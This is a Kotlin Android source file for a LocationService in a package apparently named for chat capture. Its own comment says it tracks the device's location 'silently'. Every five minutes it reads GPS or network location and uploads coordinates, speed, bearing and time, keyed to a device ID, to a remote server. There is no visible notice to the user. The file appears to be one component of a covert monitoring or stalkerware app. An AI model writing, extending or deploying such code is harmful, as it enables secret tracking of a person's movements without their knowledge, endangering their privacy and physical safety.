package com.chats.capture.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import androidx.core.app.ActivityCompat
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.network.ApiClient
import com.chats.capture.network.LocationData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Service for tracking device location silently
 * Tracks location every 5 minutes or on significant movement
 */
class LocationService(private val context: Context) {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var isTracking = false
    private var lastUploadedLocation: Location? = null
    
    private val LOCATION_UPDATE_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
    private val MIN_DISTANCE_METERS = 100f // 100 meters minimum distance for significant movement
    
    private val locationManager: LocationManager? = 
        context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    
    /**
     * Start location tracking
     */
    fun startTracking() {
        if (isTracking) {
            Timber.d("Location tracking already started")
            return
        }
        
        if (!hasLocationPermission()) {
            Timber.w("Location permission not granted")
            return
        }
        
        if (locationManager == null) {
            Timber.e("LocationManager not available")
            return
        }
        
        isTracking = true
        Timber.d("Starting location tracking")
        
        // Request initial location
        requestLocationUpdate()
        
        // Schedule periodic updates
        serviceScope.launch {
            while (isTracking) {
                delay(LOCATION_UPDATE_INTERVAL_MS)
                requestLocationUpdate()
            }
        }
    }
    
    /**
     * Stop location tracking
     */
    fun stopTracking() {
        Timber.d("Stopping location tracking")
        isTracking = false
        
        locationManager?.removeUpdates(locationListener)
    }
    
    /**
     * Request location update
     */
    private fun requestLocationUpdate() {
        if (!hasLocationPermission() || locationManager == null) {
            return
        }
        
        try {
            // Try GPS first (most accurate)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    locationManager.requestSingleUpdate(
                        LocationManager.GPS_PROVIDER,
                        locationListener,
                        Looper.getMainLooper()
                    )
                }
            }
            // Fallback to network location
            else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    locationManager.requestSingleUpdate(
                        LocationManager.NETWORK_PROVIDER,
                        locationListener,
                        Looper.getMainLooper()
                    )
                }
            }
            // Fallback to passive provider
            else if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    locationManager.requestSingleUpdate(
                        LocationManager.PASSIVE_PROVIDER,
                        locationListener,
                        Looper.getMainLooper()
                    )
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error requesting location update")
        }
    }
    
    /**
     * Location listener for receiving location updates
     */
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            handleLocationUpdate(location)
        }
        
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
            Timber.d("Location provider status changed: $provider, status: $status")
        }
        
        override fun onProviderEnabled(provider: String) {
            Timber.d("Location provider enabled: $provider")
        }
        
        override fun onProviderDisabled(provider: String) {
            Timber.d("Location provider disabled: $provider")
        }
    }
    
    /**
     * Handle location update
     */
    private fun handleLocationUpdate(location: Location) {
        try {
            // Check if location has changed significantly
            val lastLocation = lastUploadedLocation
            val shouldUpload = lastLocation == null || 
                location.distanceTo(lastLocation) >= MIN_DISTANCE_METERS
            
            if (shouldUpload) {
                Timber.d("Location updated: lat=${location.latitude}, lng=${location.longitude}, accuracy=${location.accuracy}m")
                serviceScope.launch {
                    uploadLocation(location)
                }
                lastUploadedLocation = location
            } else {
                Timber.v("Location change too small, skipping upload")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error handling location update")
        }
    }
    
    /**
     * Upload location to server
     */
    private suspend fun uploadLocation(location: Location) {
        try {
            val deviceRegistrationManager = DeviceRegistrationManager(context)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            val locationData = LocationData(
                latitude = location.latitude,
                longitude = location.longitude,
                accuracy = location.accuracy,
                altitude = location.altitude,
                speed = location.speed,
                bearing = location.bearing,
                timestamp = location.time,
                provider = location.provider
            )
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadLocation(deviceId, locationData)
            
            if (response.isSuccessful) {
                val body = response.body()?.string() ?: ""
                // Handle both JSON and plain text "OK" responses
                if (body.contains("OK") || body.contains("\"success\":true")) {
                    Timber.d("Location uploaded successfully")
                } else {
                    Timber.w("Location upload returned unexpected response: $body")
                }
            } else {
                Timber.w("Failed to upload location with code: ${response.code()}")
            }
            
        } catch (e: Exception) {
            Timber.e(e, "Error uploading location")
        }
    }
    
    /**
     * Check if location permission is granted
     */
    private fun hasLocationPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED ||
        ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Get current location (if available)
     */
    fun getCurrentLocation(): Location? {
        if (!hasLocationPermission() || locationManager == null) {
            return null
        }
        
        return try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                } else null
            } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                } else null
            } else {
                null
            }
        } catch (e: Exception) {
            Timber.e(e, "Error getting current location")
            null
        }
    }
}
